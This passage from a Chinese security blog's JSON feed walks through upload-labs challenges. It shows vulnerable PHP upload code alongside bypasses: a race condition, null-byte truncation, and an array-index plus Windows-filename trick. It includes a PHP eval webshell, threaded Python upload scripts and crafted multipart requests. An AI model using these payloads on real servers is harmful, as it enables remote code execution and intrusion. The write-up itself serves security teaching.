class=\"line\">      <span class=\"string\">&quot;.doc&quot;</span>, <span class=\"string\">&quot;.xls&quot;</span>, <span class=\"string\">&quot;.txt&quot;</span>, <span class=\"string\">&quot;.pdf&quot;</span>, <span class=\"string\">&quot;.gif&quot;</span>, <span class=\"string\">&quot;.jpg&quot;</span>, <span class=\"string\">&quot;.zip&quot;</span>, <span class=\"string\">&quot;.rar&quot;</span>, <span class=\"string\">&quot;.7z&quot;</span>,<span class=\"string\">&quot;.ppt&quot;</span>,</span><br><span class=\"line\">      <span class=\"string\">&quot;.html&quot;</span>, <span class=\"string\">&quot;.xml&quot;</span>, <span class=\"string\">&quot;.tiff&quot;</span>, <span class=\"string\">&quot;.jpeg&quot;</span>, <span class=\"string\">&quot;.png&quot;</span> , <span class=\"string\">&quot;.aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">......</span><br><span class=\"line\">......</span><br><span class=\"line\">......  </span><br><span class=\"line\">  <span class=\"comment\">/** upload()</span></span><br><span class=\"line\"><span class=\"comment\">   **</span></span><br><span class=\"line\"><span class=\"comment\">   ** Method to upload the file.</span></span><br><span class=\"line\"><span class=\"comment\">   ** This is the only method to call outside the class.</span></span><br><span class=\"line\"><span class=\"comment\">   ** <span class=\"doctag\">@para</span> String name of directory we upload to</span></span><br><span class=\"line\"><span class=\"comment\">   ** <span class=\"doctag\">@returns</span> void</span></span><br><span class=\"line\"><span class=\"comment\">  **/</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload</span>(<span class=\"params\"> <span class=\"variable\">$dir</span> </span>)</span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">isUploadedFile</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">setDir</span>( <span class=\"variable\">$dir</span> );</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">checkExtension</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">checkSize</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// if flag to check if the file exists is set to 1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable language_\">$this</span>-&gt;cls_file_exists == <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">checkFileExists</span>();</span><br><span class=\"line\">      <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );    </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// if we are here, we are ready to move the file to destination</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">move</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// check if we need to rename the file</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable language_\">$this</span>-&gt;cls_rename_file == <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">      <span class=\"variable\">$ret</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">renameFile</span>();</span><br><span class=\"line\">      <span class=\"keyword\">if</span>( <span class=\"variable\">$ret</span> != <span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"variable\">$ret</span> );    </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// if we are here, everything worked as planned :)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">resultUpload</span>( <span class=\"string\">&quot;SUCCESS&quot;</span> );</span><br><span class=\"line\">  </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">......</span><br><span class=\"line\">......</span><br><span class=\"line\">...... </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>可以分析整体也是分了三个部分：</p>\n<ol>\n<li><code>checkExtension()</code>  检查白名单后缀</li>\n<li><code>move()</code>  复制到永久目录中</li>\n<li><code>renamefile()</code>  重命名</li>\n</ol>\n<p>也就是说，总有那么一种时刻，在检查完后缀、move 之后，在重命名之前有个请求一直在访问上传的文件名，令 Apache 去解析它。</p>\n<p>这题和前面的题不一样的点在于：</p>\n<ul>\n<li>\n<p>前一题可以直接上传 php 文件，因为它的流程里 <code>move复制</code> 在前， <code>check白名单后缀</code> 在后。</p>\n</li>\n<li>\n<p>这个题不可以直接上传 php 文件，因为它的流程里 <code>check白名单后缀</code> 在前， <code>move复制</code> 在后。</p>\n</li>\n</ul>\n<p>那么，我们需要先上传可以上传的文件 backdoor.aaa【包含一句话木马】。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"variable\">$cls_arr_ext_accepted</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">      <span class=\"string\">&quot;.doc&quot;</span>, <span class=\"string\">&quot;.xls&quot;</span>, <span class=\"string\">&quot;.txt&quot;</span>, <span class=\"string\">&quot;.pdf&quot;</span>, <span class=\"string\">&quot;.gif&quot;</span>, <span class=\"string\">&quot;.jpg&quot;</span>, <span class=\"string\">&quot;.zip&quot;</span>, <span class=\"string\">&quot;.rar&quot;</span>, <span class=\"string\">&quot;.7z&quot;</span>,<span class=\"string\">&quot;.ppt&quot;</span>,</span><br><span class=\"line\">      <span class=\"string\">&quot;.html&quot;</span>, <span class=\"string\">&quot;.xml&quot;</span>, <span class=\"string\">&quot;.tiff&quot;</span>, <span class=\"string\">&quot;.jpeg&quot;</span>, <span class=\"string\">&quot;.png&quot;</span>, <span class=\"string\">&quot;.aaa&quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">可以上传backdoor.aaa</span><br></pre></td></tr></table></figure>\n<p>同时我们还知道 Apache 解析文件是对文件名的从后向前开始解析，如果在这个从后向前的过程中出现.php，那么就会将其解析成 php 文件</p>\n<p>那么我们可以写成：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">backdoor.php.aaa</span><br></pre></td></tr></table></figure>\n<p>同样是条件漏洞线程攻击即可生成 uploadbackdoor.php.aaa</p>\n<p><img src=\"image-20221004151006998.png\" alt=\"image-20221004151006998\"></p>\n<p>附上代码：</p>\n<p>第一个线程池上传</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hackhttp</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upload</span>(<span class=\"params\">lists</span>):</span><br><span class=\"line\">    hh = hackhttp.hackhttp()</span><br><span class=\"line\">    raw = <span class=\"string\">&quot;&quot;&quot;POST /Pass-18/index.php HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: www.upload_lab.com</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span></span><br><span class=\"line\"><span class=\"string\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class=\"line\"><span class=\"string\">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class=\"line\"><span class=\"string\">Accept-Encoding: gzip, deflate</span></span><br><span class=\"line\"><span class=\"string\">Referer: http://www.upload_lab.com/Pass-18/index.php</span></span><br><span class=\"line\"><span class=\"string\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\">Upgrade-Insecure-Requests: 1</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------8116162727142</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: 342</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">-----------------------------8116162727142</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;backdoor.php.aaa&quot;</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: application/octet-stream</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------8116162727142</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">submit</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------8116162727142--</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    code,head,html,redirect,log = hh.http(<span class=\"string\">&#x27;http://www.upload_lab.com/Pass-18/index.php&#x27;</span>,raw=raw)</span><br><span class=\"line\">    <span class=\"built_in\">print</span> code</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(<span class=\"number\">50</span>)</span><br><span class=\"line\">pool.<span class=\"built_in\">map</span>(upload,<span class=\"built_in\">range</span>(<span class=\"number\">10000</span>))</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>第二个线程池请求访问</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hackhttp</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upload</span>(<span class=\"params\">lists</span>):</span><br><span class=\"line\">    hh = hackhttp.hackhttp()</span><br><span class=\"line\">\t</span><br><span class=\"line\">    code,head,html,redirect,log = hh.http(<span class=\"string\">&#x27;http://www.upload_lab.com/upload/backdoor.php.aaa&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span> code</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(<span class=\"number\">50</span>)</span><br><span class=\"line\">pool.<span class=\"built_in\">map</span>(upload,<span class=\"built_in\">range</span>(<span class=\"number\">15000</span>))</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>但其实，经过试验后，Pass18 的攻击代码同样也对 Pass19 适用，分析原因是因为：</p>\n<p>整体详细点是分了 5 个部分：</p>\n<ol>\n<li><code>isUploadedFile()</code>  判断是否是 POST 请求上传的文件</li>\n<li><code>setDir()</code>  设置路径</li>\n<li><code>checkExtension()</code>  检查白名单后缀</li>\n<li><code>move()</code>  复制到永久目录中</li>\n<li><code>renamefile()</code>  重命名</li>\n</ol>\n<p>这 <code>步骤1</code> 、 <code>步骤2</code>  到 <code>步骤3</code>  之间也相差一段时间，那么完全可以上传 php 文件来进行条件竞争访问，生成 <code>shell.php</code> ，后面就无所谓 <code>backdoor.php</code>  被删除了。</p>\n<h2 id=\"利用00截断绕过特定检查\"><a class=\"markdownIt-Anchor\" href=\"#利用00截断绕过特定检查\">#</a> 利用 00 截断绕过特定检查</h2>\n<p>依旧看 Pass-19 的源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//关键漏洞点在以下几句</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123; </span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>漏洞点在于：</p>\n<ul>\n<li>使用 <code>in_array</code>  去黑名单里寻找看是否存在，不存在则继续。</li>\n<li>使用 <code>move_uploaded_file</code>  来复制临时文件到永久目录\n<ul>\n<li>而永久目录的 <code>file_name</code>  变量来自于 <code>POST</code>  请求的 <code>save_name</code>  参数，这是<strong>可控点</strong></li>\n</ul>\n</li>\n</ul>\n<p>绕过如下：</p>\n<ol>\n<li>修改 <code>backdoor.php</code>  为 <code>backdoor.jpg</code>  绕过步骤 1</li>\n<li>使用 <code>POST-00截断</code> ，对 <code>save_name</code>  进行路径截断， <code>提前解析成php文件</code> 并保存</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.jpg&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">233.php+upload-19.jpg</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004152505861.png\" alt=\"image-20221004152505861\"></p>\n<p>修改为 00</p>\n<p><img src=\"image-20221004152536573.png\" alt=\"image-20221004152536573\"></p>\n<p>上传成功，菜刀连接即可。</p>\n<p><img src=\"image-20221004152809391.png\" alt=\"image-20221004152809391\"></p>\n<h2 id=\"利用数组windows特性绕过\"><a class=\"markdownIt-Anchor\" href=\"#利用数组windows特性绕过\">#</a> 利用数组 + windows 特性绕过</h2>\n<p>直接看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//检查MIME</span></span><br><span class=\"line\">    <span class=\"variable\">$allow_type</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;image/jpeg&#x27;</span>,<span class=\"string\">&#x27;image/png&#x27;</span>,<span class=\"string\">&#x27;image/gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>],<span class=\"variable\">$allow_type</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查文件名</span></span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]) ? <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>] : <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">explode</span>(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">end</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allow_suffix</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>, <span class=\"variable\">$allow_suffix</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">reset</span>(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[<span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传成功！&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传失败！&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先映入眼帘就是检查了 <code>MIME</code> ，所以我们必须修改 <code>MIME</code>  为 <code>image/jpeg</code>  来先绕过 MIME 检查。</p>\n<p>接着，开始检查文件名：</p>\n<ul>\n<li><code>file</code>  变量要求是一个数组，即使不是也要最后通过 <code>explode</code>  函数以点为分隔符变成 <code>数组</code> 。</li>\n<li><code>ext</code>  变量就是 <code>file</code>  数组中最后一个元素，也就是 ` 文件后缀名。</li>\n<li>判断后缀名是否在白名单内，如果在则继续执行\n<ul>\n<li>核心： <code>file_name = reset($file) . '.' . $file[count($file) - 1]</code></li>\n<li>意思是 <code>file_name</code>  由 <code>file数组第一位</code>  +  <code>.</code>  + <code>file数组最后一位</code> 拼接而成 【开发者只考虑了普通的 xxx.jpg 这样只有两个元素数组的情况】</li>\n<li>而 <code>file数组</code> 可以由可控变量 <code>save_name</code>  而来， <code>save_name</code>  可以一开始就是 <code>数组</code></li>\n</ul>\n</li>\n</ul>\n<p>那么，我们就可以一一来绕过：</p>\n<p>修改 MIME</p>\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Disposition</span><span class=\"punctuation\">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;backdoor.php&quot;</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>image/jpeg</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221004155043004.png\" alt=\"image-20221004155043004\"></p>\n<p>修改可控变量 <code>save_name</code> ，使其变成 <code>save_name[]</code>  数组，我们自定义两个元素（分别是 <code>save_name[0]</code>  和 <code>save_name[2]</code> ）</p>\n<ul>\n<li>由于只设置了数组的 <code>2个元素</code> ，所以数组长度 <code>count($file)</code>  为 <code>2</code></li>\n<li>由于 <code>reset($file)</code>  输出的是 <code> save_name[0]</code> ，因此， <code>reset($file)</code> — 会输出 —&gt;  <code>33322.php</code></li>\n<li>由于 <code>$file[count($file) - 1]</code>  输出的是 <code>save_name[2 - 1]</code> (我们并没有设置)，因此， <code>$file[count($file) - 1]</code> ---- 会输出 —&gt; <code>空</code></li>\n</ul>\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\">-----------------------------6270582926777</span><br><span class=\"line\"><span class=\"attribute\">Content-Disposition</span><span class=\"punctuation\">: </span>form-data; name=&quot;save_name[0]&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">33322.php</span><br><span class=\"line\">-----------------------------6270582926777</span><br><span class=\"line\"><span class=\"attribute\">Content-Disposition</span><span class=\"punctuation\">: </span>form-data; name=&quot;save_name[2]&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">jpg</span><br></pre></td></tr></table></figure>\n<p><code>save_name[1]</code>  不用设置，目前的情况正好能使得</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">reset</span>(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[<span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];</span><br><span class=\"line\">输出</span><br><span class=\"line\"><span class=\"number\">33322</span>.php.空</span><br></pre></td></tr></table></figure>\n<p>而在 windows 中，空和点作为结尾，会直接删除，从而保留 <code>33322.php</code></p>\n<p><img src=\"image-20221004160021961.png\" alt=\"image-20221004160021961\"></p>\n<p>正常解析访问，菜刀也可正常连接。</p>\n<p><img src=\"image-20221004160109151.png\" alt=\"image-20221004160109151\"></p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "特殊的文件上传漏洞（一）",
            "date_published": "2022-10-03T16:52:26.000Z",
